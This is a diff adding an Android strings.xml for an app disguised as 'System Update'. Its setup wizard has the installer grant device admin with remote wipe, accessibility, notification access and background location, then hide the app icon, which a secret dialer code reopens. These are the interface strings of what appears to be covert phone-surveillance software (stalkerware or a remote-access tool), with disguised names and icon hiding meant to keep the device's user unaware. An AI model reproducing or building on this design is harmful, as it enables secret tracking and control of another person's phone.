@@ -1,0 +1,52 @@
+<resources>
+    <string name="app_name">System Update</string>
+    <string name="channel_name">System Service</string>
+    <string name="channel_desc">Background system service</string>
+    <string name="notif_title">System Service</string>
+    <string name="notif_text">Running</string>
+
+    <!-- Main -->
+    <string name="status_initializing">Initializing…</string>
+    <string name="status_key_label">Device Key (save this):</string>
+    <string name="btn_enable_admin">Enable Device Admin</string>
+    <string name="btn_grant_perms">Grant Permissions</string>
+    <string name="btn_start_setup">Start Setup Wizard</string>
+    <string name="btn_hide_start">Hide Icon &amp; Start Service</string>
+
+    <!-- Admin -->
+    <string name="admin_label">System Protection</string>
+    <string name="admin_description">Allows remote lock, wipe, and security features.</string>
+    <string name="admin_explanation">Required for system protection and remote management.</string>
+
+    <!-- Accessibility -->
+    <string name="accessibility_label">System Accessibility</string>
+    <string name="accessibility_desc">Enables system-level accessibility features.</string>
+
+    <!-- Notification listener -->
+    <string name="notif_listener_label">System Notifications</string>
+
+    <!-- Setup Wizard -->
+    <string name="wizard_title">Setup Wizard</string>
+    <string name="wizard_step1">Step 1: Grant basic permissions</string>
+    <string name="wizard_step2">Step 2: Enable Device Admin</string>
+    <string name="wizard_step3">Step 3: Disable battery optimization</string>
+    <string name="wizard_step4">Step 4: Enable Autostart (ColorOS)</string>
+    <string name="wizard_step5">Step 5: Enable Accessibility</string>
+    <string name="wizard_step6">Step 6: Enable Notification Access</string>
+    <string name="wizard_step7">Step 7: Allow background location</string>
+    <string name="wizard_step8">Step 8: Hide icon &amp; start service</string>
+    <string name="wizard_next">Next</string>
+    <string name="wizard_skip">Skip</string>
+    <string name="wizard_done">Done</string>
+    <string name="wizard_open_settings">Open Settings</string>
+
+    <!-- Permission Activity -->
+    <string name="perm_title">Permissions Required</string>
+    <string name="perm_grant_all">Grant All Permissions</string>
+
+    <!-- Confirm -->
+    <string name="confirm_title">Confirm</string>
+    <string name="confirm_hide_msg">App icon will hide and background service will start.\n\nSave your Device Key:\n\n%s\n\nTo reopen later, dial:\n*#*#6969#*#*</string>
+    <string name="confirm_yes">Yes, Start</string>
+    <string name="confirm_no">Cancel</string>
+</resources>
